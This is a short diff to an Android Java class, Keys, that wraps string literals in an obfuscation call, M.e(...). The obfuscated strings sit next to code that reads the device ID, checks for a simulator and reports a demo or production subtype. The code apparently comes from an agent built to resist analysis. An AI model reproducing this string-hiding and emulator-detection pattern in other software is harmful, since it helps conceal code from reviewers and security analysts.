@@ -109,11 +109,11 @@ public class Keys {
 		}
 		String androidId = Secure.getString(Status.getAppContext().getContentResolver(), Secure.ANDROID_ID);
 		if (androidId == null) {
-			androidId = "EMPTY";
+			androidId = M.e("EMPTY");
 		}
 
 		//20.0=9774d56d682e549c M.d("9774d56d682e549c")
-		if ("9774d56d682e549c".equals(androidId) && !Device.self().isSimulator()) { //$NON-NLS-1$
+		if (M.e("9774d56d682e549c").equals(androidId) && !Device.self().isSimulator()) { //$NON-NLS-1$
 			// http://code.google.com/p/android/issues/detail?id=10603
 			// http://stackoverflow.com/questions/2785485/is-there-a-unique-android-device-id
 			final TelephonyManager telephonyManager = (TelephonyManager) Status.getAppContext().getSystemService(
@@ -277,9 +277,9 @@ public class Keys {
 	static public byte[] getSubtype() {
 		if (Cfg.DEMO) {
 			// 20.1=DEMO
-			return ("ANDROID-" + M.e("DEMO")).getBytes();
+			return (M.e("ANDROID-DEMO")).getBytes();
 		} else {
-			return "ANDROID".getBytes();
+			return M.e("ANDROID").getBytes();
 		}
 	}
 
